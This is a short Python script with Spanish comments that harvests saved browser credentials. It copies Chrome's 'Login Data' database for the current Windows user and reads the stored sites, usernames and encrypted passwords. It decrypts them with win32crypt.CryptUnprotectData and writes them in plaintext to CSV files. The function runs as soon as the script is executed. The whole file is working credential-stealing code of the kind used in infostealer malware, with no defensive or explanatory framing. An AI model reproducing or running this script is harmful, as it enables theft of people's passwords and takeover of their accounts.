import sqlite3 
import pandas.io.sql
import pandas  
import os 
import win32crypt
import shutil, getpass
from shutil import copyfile 
import time, threading
import csv 

def contrachrome():

##copia archivo de login data de chrome a carpeta local 
	src ="C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data" %(getpass.getuser())
	dest=os.getcwd() 

	def copyFile(src,dest):
		try:
			shutil.copy(src,dest)
		
		except shutil.Error as e:
			print('Error: %s' %e)


	copyFile(src,dest)
##copia archivo de login data de chrome a carpeta local 



#crea base de datos del login data y exporta a csv 
	data_path = os.getcwd()
	files = os.listdir(data_path)
	pass_db = os.path.join(data_path,'Login Data')

	c = sqlite3.connect(pass_db)
	cursor = c.cursor()
	pand=pandas.io.sql.read_sql("SELECT origin_url, username_value, password_value FROM logins", c)
	pand.to_csv('contras.csv')

	select_query = ("SELECT action_url, username_value, password_value FROM logins")
	cursor.execute(select_query)

	datos_login = cursor.fetchall()
	#print(datos_login)
		
	#Se crea archivo csv y se decifran las contraseñas para después escribrse dentro el mismo csv
	with open('passwords.csv','w') as output_file:
		csv_writer=csv.writer(output_file, quoting=csv.QUOTE_ALL)
		headers= []
		csv_writer.writerow(headers)  
		for result in datos_login:
			pwd = win32crypt.CryptUnprotectData(result[2],None,None,None,0)[1] 
			lista_final = (('Sitio', result[0]) + ('Usuario', result[1]) + ('Contraseña(lo que esta entre comillas)', pwd))
			csv_writer.writerow(lista_final)
	output_file.close()


contrachrome()

